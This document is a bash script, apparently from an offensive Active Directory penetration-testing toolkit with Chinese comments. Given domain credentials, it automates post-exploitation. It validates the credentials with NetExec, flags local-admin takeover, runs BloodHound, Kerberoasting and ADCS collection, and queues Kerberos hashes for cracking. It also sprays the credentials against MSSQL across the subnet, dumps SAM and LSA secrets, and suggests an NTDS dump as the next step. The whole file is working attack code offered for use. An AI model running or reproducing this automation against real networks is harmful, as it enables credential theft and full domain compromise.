#!/usr/bin/env bash
# autopwn-continue.sh v2 — 有凭据后深入(通用)
# 用法: autopwn-continue.sh <DC IP> <域名> <用户> <密码> [--proxy]
set -uo pipefail
source "$(dirname "$(readlink -f "$0")")/lib/common.sh"
source "$(dirname "$(readlink -f "$0")")/lib/recon.sh"
source "$(dirname "$(readlink -f "$0")")/lib/project.sh"
source "$(dirname "$(readlink -f "$0")")/lib/state.sh"
[ $# -ge 4 ] || { echo "用法: $0 <DC IP> <域名> <用户> <密码> [--proxy]"; exit 1; }
DCIP="$1"; DOMAIN="$2"; USERNAME="$3"; PASS="$4"; shift 4
P=""; [ "${1:-}" = "--proxy" ] && P="proxychains4 -q"

LOOT=$(mktmpdir apn-cont)

echo "═══ AutoPwn Continue: $DOMAIN\\$USERNAME ═══"

# 验证
AUTH=$($P nxc smb "$DCIP" -u "$USERNAME" -p "$PASS" -d "$DOMAIN" 2>/dev/null | grep '\[+\]')
[ -z "$AUTH" ] && { echo "凭据无效"; exit 1; }
ok "$AUTH"

# 权限面
PWN3D=$(echo "$AUTH" | grep -c 'Pwn3d')
[ "$PWN3D" -gt 0 ] && ok "🎉 Pwn3d! 已是本地管理员"

# 凭据验证成功 → state 登记(主体格式与 cred_log 一致:域\用户;值只留 sha256 指纹)+ valid_for 记录
SUBJ="$DOMAIN\\$USERNAME"
state_cred_add 密码 "$SUBJ" "$DOMAIN" autopwn-continue "$PASS"
state_cred_verify "$SUBJ" "$DCIP"
[ "$PWN3D" -gt 0 ] && state_tried_mark "autopwn:admin:$DCIP" 0
# Pwn3d → 主机标记已拿下 + 高危发现登记(fail-safe,无项目静默跳过)
if [ "$PWN3D" -gt 0 ]; then
    state_host_owned "$DCIP"
    state_finding_add "主机拿下(本地管理员)" 高 "autopwn-continue" "$DCIP"
fi

# 已验证凭据 → 凭据台账 creds.csv;Pwn3d → 项目 notes.md(无项目静默跳过)
cred_log 密码 "$SUBJ" "$DOMAIN" "$PASS" "autopwn-continue" \
    "$([ "$PWN3D" -gt 0 ] && echo "本地管理员($DCIP)" || echo 未知)"
# 值命中 → state used=true 且 creds.csv 用过没→已用
state_cred_use "$PASS"
[ "$PWN3D" -gt 0 ] && proj_note "🎉 Pwn3d! $DOMAIN\\$USERNAME 已是 $DCIP 本地管理员(autopwn-continue)"

# 深度情报三件套:BH / Kerberoast / ADCS
intel_collect "$DCIP" "$DOMAIN" "$USERNAME" "$PASS" "$LOOT" "$LOOT/kerb.txt" "$P"
# Kerberoast 哈希 → 项目 hashqueue(去重;无项目静默跳过)
[ -f "$LOOT/kerb.txt" ] && { grep '\$krb5tgs\$' "$LOOT/kerb.txt" || true; } | hashqueue_add

# MSSQL(全网段)
echo -e "${Y}[▶]${N} MSSQL 全段探测..."
NET=$(echo "$DCIP" | sed 's/\.[0-9]*$/.0\/24/')
$P nxc mssql "$NET" -u "$USERNAME" -p "$PASS" -d "$DOMAIN" --continue-on-success 2>/dev/null | grep '\[+\]' | head -3

# DCSync(如果是 DA)
if [ "$PWN3D" -gt 0 ]; then
    echo -e "${Y}[▶]${N} NTDS(域管权限)..."
    $P nxc smb "$DCIP" -u "$USERNAME" -p "$PASS" -d "$DOMAIN" --sam --lsa 2>/dev/null | grep '\[+\]' | head -3
    echo "下一步: nxc smb $DCIP -u $USERNAME -p '<PASS>' -d $DOMAIN --ntds"
fi

echo ""
echo "产物: $LOOT"
echo "控制台: http://127.0.0.1:8765"
